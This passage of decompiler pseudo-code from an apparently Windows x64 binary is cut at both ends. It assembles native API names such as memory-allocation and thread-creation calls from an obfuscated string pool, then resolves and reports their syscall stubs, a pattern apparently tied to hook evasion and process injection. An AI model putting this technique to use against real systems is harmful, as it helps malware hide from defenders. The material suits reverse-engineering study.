L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005b1e;\n    fcn.1400ba740(&stack0x00001348 + iVar5, &stack0x00001368 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005b3b;\n    fcn.1400ba740(&stack0x00001328 + iVar5, &stack0x00001348 + iVar5, \n                  L\"iruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005b58;\n    fcn.1400ba740(&stack0x00001308 + iVar5, &stack0x00001328 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005b75;\n    fcn.1400ba740(&stack0x000012e8 + iVar5, &stack0x00001308 + iVar5, L\"ngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005b92;\n    fcn.1400ba740(&stack0x000012c8 + iVar5, &stack0x000012e8 + iVar5, L\"PCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005baf;\n    fcn.1400ba740(&stack0x000012a8 + iVar5, &stack0x000012c8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005bcc;\n    fcn.1400ba740(&stack0x00001288 + iVar5, &stack0x000012a8 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005be9;\n    fcn.1400ba740(&stack0x00001268 + iVar5, &stack0x00001288 + iVar5, \n                  L\"caeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005c06;\n    fcn.1400ba740(&stack0x00001248 + iVar5, &stack0x00001268 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005c23;\n    fcn.1400ba740(&stack0x00001228 + iVar5, &stack0x00001248 + iVar5, L\"sFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005c40;\n    fcn.1400ba740(&stack0x00001208 + iVar5, &stack0x00001228 + iVar5, L\"sFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005c56;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00001208 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005c65;\n    fcn.1400aa2e0(&stack0x00001208 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005c74;\n    fcn.1400aa2e0(&stack0x00001228 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005c83;\n    fcn.1400aa2e0(&stack0x00001248 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005c92;\n    fcn.1400aa2e0(&stack0x00001268 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005ca1;\n    fcn.1400aa2e0(&stack0x00001288 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005cb0;\n    fcn.1400aa2e0(&stack0x000012a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005cbf;\n    fcn.1400aa2e0(&stack0x000012c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005cce;\n    fcn.1400aa2e0(&stack0x000012e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005cdd;\n    fcn.1400aa2e0(&stack0x00001308 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005cec;\n    fcn.1400aa2e0(&stack0x00001328 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005cfb;\n    fcn.1400aa2e0(&stack0x00001348 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005d0a;\n    fcn.1400aa2e0(&stack0x00001368 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005d19;\n    fcn.1400aa2e0(&stack0x00001388 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005d28;\n    fcn.1400aa2e0(&stack0x000013a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005d37;\n    fcn.1400aa2e0(&stack0x000013c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005d46;\n    fcn.1400aa2e0(&stack0x000013e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005d55;\n    fcn.1400aa2e0(&stack0x00001408 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005d64;\n    fcn.1400aa2e0(&stack0x00001428 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005d73;\n    fcn.1400aa2e0(&stack0x00001448 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005d82;\n    fcn.1400aa2e0(&stack0x00001468 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005d91;\n    fcn.1400aa2e0(&stack0x00001488 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005da0;\n    fcn.1400aa2e0(&stack0x000014a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005daf;\n    fcn.1400aa2e0(&stack0x000014c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005dbe;\n    fcn.1400aa2e0(&stack0x000014e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005dcd;\n    fcn.1400aa2e0(&stack0x00001508 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005ddc;\n    fcn.140072290(&stack0x00001537 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005df2;\n    fcn.1400a9730(&stack0x00001538 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00002ff0 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005e2e;\n    uVar3 = fcn.1400015bd(&stack0x00001538 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005e43;\n    fcn.1400aa2e0(&stack0x00001538 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005e6b;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005e80;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005e8f;\n    fcn.140072260(&stack0x000017c7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005eaf;\n    fcn.1400a9bc0(&stack0x00001798 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x000017c7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005ecc;\n    fcn.1400ba740(&stack0x00001778 + iVar5, &stack0x00001798 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005ee9;\n    fcn.1400ba740(&stack0x00001758 + iVar5, &stack0x00001778 + iVar5, L\"RsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005f06;\n    fcn.1400ba740(&stack0x00001738 + iVar5, &stack0x00001758 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005f23;\n    fcn.1400ba740(&stack0x00001718 + iVar5, &stack0x00001738 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005f40;\n    fcn.1400ba740(&stack0x000016f8 + iVar5, &stack0x00001718 + iVar5, L\"dExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005f5d;\n    fcn.1400ba740(&stack0x000016d8 + iVar5, &stack0x000016f8 + iVar5, \n                  L\"ViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005f7a;\n    fcn.1400ba740(&stack0x000016b8 + iVar5, &stack0x000016d8 + iVar5, \n                  L\"iruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005f97;\n    fcn.1400ba740(&stack0x00001698 + iVar5, &stack0x000016b8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005fb4;\n    fcn.1400ba740(&stack0x00001678 + iVar5, &stack0x00001698 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005fd1;\n    fcn.1400ba740(&stack0x00001658 + iVar5, &stack0x00001678 + iVar5, \n                  L\"uMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140005fee;\n    fcn.1400ba740(&stack0x00001638 + iVar5, &stack0x00001658 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000600b;\n    fcn.1400ba740(&stack0x00001618 + iVar5, &stack0x00001638 + iVar5, \n                  L\"locaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006028;\n    fcn.1400ba740(&stack0x000015f8 + iVar5, &stack0x00001618 + iVar5, \n                  L\"Mmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006045;\n    fcn.1400ba740(&stack0x000015d8 + iVar5, &stack0x000015f8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006062;\n    fcn.1400ba740(&stack0x000015b8 + iVar5, &stack0x000015d8 + iVar5, \n                  L\"my\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000607f;\n    fcn.1400ba740(&stack0x00001598 + iVar5, &stack0x000015b8 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000609c;\n    fcn.1400ba740(&stack0x00001578 + iVar5, &stack0x00001598 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400060b9;\n    fcn.1400ba740(&stack0x00001558 + iVar5, &stack0x00001578 + iVar5, \n                  L\"y\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400060cf;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00001558 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400060de;\n    fcn.1400aa2e0(&stack0x00001558 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400060ed;\n    fcn.1400aa2e0(&stack0x00001578 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400060fc;\n    fcn.1400aa2e0(&stack0x00001598 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000610b;\n    fcn.1400aa2e0(&stack0x000015b8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000611a;\n    fcn.1400aa2e0(&stack0x000015d8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006129;\n    fcn.1400aa2e0(&stack0x000015f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006138;\n    fcn.1400aa2e0(&stack0x00001618 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006147;\n    fcn.1400aa2e0(&stack0x00001638 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006156;\n    fcn.1400aa2e0(&stack0x00001658 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006165;\n    fcn.1400aa2e0(&stack0x00001678 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006174;\n    fcn.1400aa2e0(&stack0x00001698 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006183;\n    fcn.1400aa2e0(&stack0x000016b8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006192;\n    fcn.1400aa2e0(&stack0x000016d8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400061a1;\n    fcn.1400aa2e0(&stack0x000016f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400061b0;\n    fcn.1400aa2e0(&stack0x00001718 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400061bf;\n    fcn.1400aa2e0(&stack0x00001738 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400061ce;\n    fcn.1400aa2e0(&stack0x00001758 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400061dd;\n    fcn.1400aa2e0(&stack0x00001778 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400061ec;\n    fcn.1400aa2e0(&stack0x00001798 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400061fb;\n    fcn.140072290(&stack0x000017c7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006211;\n    fcn.1400a9730(&stack0x000017c8 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00002fe8 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000624d;\n    uVar3 = fcn.1400015bd(&stack0x000017c8 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006262;\n    fcn.1400aa2e0(&stack0x000017c8 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000628a;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000629f;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400062ae;\n    fcn.140072260(&stack0x000018d7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400062ce;\n    fcn.1400a9bc0(&stack0x000018a8 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x000018d7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400062eb;\n    fcn.1400ba740(&stack0x00001888 + iVar5, &stack0x000018a8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006308;\n    fcn.1400ba740(&stack0x00001868 + iVar5, &stack0x00001888 + iVar5, L\"CThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006325;\n    fcn.1400ba740(&stack0x00001848 + iVar5, &stack0x00001868 + iVar5, \n                  L\"locaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006342;\n    fcn.1400ba740(&stack0x00001828 + iVar5, &stack0x00001848 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000635f;\n    fcn.1400ba740(&stack0x00001808 + iVar5, &stack0x00001828 + iVar5, L\"sFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000637c;\n    fcn.1400ba740(&stack0x000017e8 + iVar5, &stack0x00001808 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006392;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x000017e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400063a1;\n    fcn.1400aa2e0(&stack0x000017e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400063b0;\n    fcn.1400aa2e0(&stack0x00001808 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400063bf;\n    fcn.1400aa2e0(&stack0x00001828 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400063ce;\n    fcn.1400aa2e0(&stack0x00001848 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400063dd;\n    fcn.1400aa2e0(&stack0x00001868 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400063ec;\n    fcn.1400aa2e0(&stack0x00001888 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400063fb;\n    fcn.1400aa2e0(&stack0x000018a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000640a;\n    fcn.140072290(&stack0x000018d7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006420;\n    fcn.1400a9730(&stack0x000018d8 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00002fe0 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000645c;\n    uVar3 = fcn.1400015bd(&stack0x000018d8 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006471;\n    fcn.1400aa2e0(&stack0x000018d8 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006499;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400064ae;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400064bd;\n    fcn.140072260(&stack0x00001aa7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400064dd;\n    fcn.1400a9bc0(&stack0x00001a78 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00001aa7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400064fa;\n    fcn.1400ba740(&stack0x00001a58 + iVar5, &stack0x00001a78 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006517;\n    fcn.1400ba740(&stack0x00001a38 + iVar5, &stack0x00001a58 + iVar5, L\"ObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006534;\n    fcn.1400ba740(&stack0x00001a18 + iVar5, &stack0x00001a38 + iVar5, L\"pGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006551;\n    fcn.1400ba740(&stack0x000019f8 + iVar5, &stack0x00001a18 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000656e;\n    fcn.1400ba740(&stack0x000019d8 + iVar5, &stack0x000019f8 + iVar5, L\"ngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000658b;\n    fcn.1400ba740(&stack0x000019b8 + iVar5, &stack0x000019d8 + iVar5, L\"PCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400065a8;\n    fcn.1400ba740(&stack0x00001998 + iVar5, &stack0x000019b8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400065c5;\n    fcn.1400ba740(&stack0x00001978 + iVar5, &stack0x00001998 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400065e2;\n    fcn.1400ba740(&stack0x00001958 + iVar5, &stack0x00001978 + iVar5, \n                  L\"caeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400065ff;\n    fcn.1400ba740(&stack0x00001938 + iVar5, &stack0x00001958 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000661c;\n    fcn.1400ba740(&stack0x00001918 + iVar5, &stack0x00001938 + iVar5, L\"sFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006639;\n    fcn.1400ba740(&stack0x000018f8 + iVar5, &stack0x00001918 + iVar5, L\"sFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000664f;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x000018f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000665e;\n    fcn.1400aa2e0(&stack0x000018f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000666d;\n    fcn.1400aa2e0(&stack0x00001918 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000667c;\n    fcn.1400aa2e0(&stack0x00001938 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000668b;\n    fcn.1400aa2e0(&stack0x00001958 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000669a;\n    fcn.1400aa2e0(&stack0x00001978 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400066a9;\n    fcn.1400aa2e0(&stack0x00001998 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400066b8;\n    fcn.1400aa2e0(&stack0x000019b8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400066c7;\n    fcn.1400aa2e0(&stack0x000019d8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400066d6;\n    fcn.1400aa2e0(&stack0x000019f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400066e5;\n    fcn.1400aa2e0(&stack0x00001a18 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400066f4;\n    fcn.1400aa2e0(&stack0x00001a38 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006703;\n    fcn.1400aa2e0(&stack0x00001a58 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006712;\n    fcn.1400aa2e0(&stack0x00001a78 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006721;\n    fcn.140072290(&stack0x00001aa7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006737;\n    fcn.1400a9730(&stack0x00001aa8 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00002fd8 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006773;\n    uVar3 = fcn.1400015bd(&stack0x00001aa8 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140006788;\n    fcn.1400aa2e0(&stack0x00001aa8 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 